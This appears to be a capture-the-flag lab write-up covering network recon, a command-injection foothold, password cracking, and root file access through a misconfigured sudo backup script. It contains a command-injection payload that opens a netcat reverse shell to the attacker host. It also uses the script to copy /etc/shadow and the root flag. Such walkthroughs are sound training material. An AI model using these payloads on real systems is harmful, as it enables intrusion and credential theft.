---
share_link: https://share.note.sx/vpq8adns#t/gAJNKAhzqmaaMGJV9IxzoDS/92dQtJOEk66s5b1ng
share_updated: 2025-05-09T18:25:48+05:30
---


---

###  Step 1: Reconnaissance – Identifying the Target

We start by scanning the local network to identify live hosts using `arp-scan`:

```bash
sudo arp-scan --local
```

![[Pasted image 20250503150537.png]]

This reveals our target machine with the IP: **192.168.112.232**

---

###  Step 2: Port Scanning – What’s Open?

A quick port scan using `nmap` shows which services are running:

```bash
nmap 192.168.112.232
```

![[Pasted image 20250503150558.png]]

We see that **ports 22 (SSH)** and **80 (HTTP)** are open.

Now, let's do a deeper service and version scan on these ports:

```bash
nmap 192.168.112.232 -p22,80 -sCV
```

![[Pasted image 20250503150621.png]]

This reveals:

- **Port 80** is running Apache (suggesting a web server is hosted)
    
- **Port 22** is running OpenSSH
    

---

###  Step 3: Web Exploitation – Gaining Foothold

Navigating to the website reveals a form input vulnerable to **command injection**. By injecting a command like:

```bash
;busybox nc 192.168.112.156 9999 -c sh
```

![[Pasted image 20250503150445.png]]

We trigger a reverse shell connection to our attacker machine. Boom — we get a shell back as **www-data**, the web server user.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
to stabilize the shell session for better interactivity and command execution

![[Pasted image 20250507222054.png]]


---

###  Step 4: File Looting – Extracting User Data

While poking around the web server, we find a file named `users.db`. We host a Python web server on our attacker machine to download the file:

```bash
python3 -m http.server
```


Once downloaded, we analyze the contents — it contains **SHA256crypt** hashed passwords.

![[Pasted image 20250503150813.png]]

We crack the hash using an online cracking tool (`hash.traboda.net`) and recover:

> **Cracked password:** `secretpass123`



---

### Step 5: Lateral Movement – Switching Users

We try the cracked password with an existing user and successfully log in as **devuser** via SSH.

![[Pasted image 20250507215908.png]]

---

##  Step 6: Privilege Escalation – Getting Root

Now logged in as `devuser`, we check for potential privilege escalation paths using:

```bash
sudo -l
```

> 🔎 `sudo -l` lists all the commands the current user can run using `sudo`. This helps identify any scripts or binaries the user can execute as root without a password.

![[Pasted image 20250503152540.png]]

We find:

```bash
User devuser may run the following commands on corpnet:
  (ALL) NOPASSWD: /usr/local/bin/backup.sh
```

This means `devuser` can run the script `/usr/local/bin/backup.sh` as **root**, without needing a password.

---

#### Analyzing `backup.sh`

```bash
#!/bin/bash
# Usage: ./backup.sh <filename>

if [ $# -eq 0 ]; then
  echo "Please provide a filename to backup"
  exit 1
fi

BACKUP_FILE="/tmp/backup_$(date +%F_%T)"
cp "$1" "$BACKUP_FILE"
chown devuser:devuser "$BACKUP_FILE"
chmod 644 "$BACKUP_FILE"
```

This script blindly copies any file passed to it, as **root**, and then changes the ownership to `devuser`, effectively allowing access to protected files.

####  Exploiting It

We can use this to read sensitive root-only files. For example:

```bash
sudo /usr/local/bin/backup.sh /etc/shadow
```

![[Pasted image 20250507220110.png]]

This copies `/etc/shadow` to a readable file in `/tmp`. From there, we attempt to crack the root password — but the cracking failed.

---

### 🏁 Capturing the Flag

Instead of cracking the root password, we go for the flag directly:

```bash
sudo /usr/local/bin/backup.sh /root/flag.txt
```

![[Pasted image 20250507220324.png]]

We then read the file:

```bash
cat /tmp/backup_2025-05-07_22:02:04
```

![[Pasted image 20250507220400.png]]

🎉 Flag captured!
